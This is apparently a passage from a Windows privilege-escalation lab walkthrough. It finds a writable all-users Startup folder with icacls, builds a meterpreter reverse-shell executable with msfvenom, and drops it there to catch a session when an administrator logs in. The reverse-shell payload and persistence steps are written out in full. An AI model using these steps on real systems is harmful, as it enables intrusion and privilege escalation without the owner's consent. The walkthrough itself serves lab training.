
When the machine is boot up, there are some applications run during the startup process. We can check whether there are any startup applications that we have permission to modify. We are going to use a tool call `icacls.exe` to check for these permissions.

```PowerShell
C:\Users\user>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
BUILTIN\Users:(F)
TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We see `BUILTIN\Users` have Full Access `(F)` to the startup directory. We can use `msfvenom` as usual to create a payload to generate a reverse shell and put it in this directory.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o startup.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: startup.exe
```

When an administrator logs in, we catch the meterpreter session and gain privileged shell.

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (177734 bytes) to 10.10.97.83
[*] Meterpreter session 1 opened (10.4.72.115:4444 -> 10.10.97.83:49321) at 2025-07-15 13:02:16 +1000

meterpreter > getuid 
Server username: TCM-PC\TCM
```
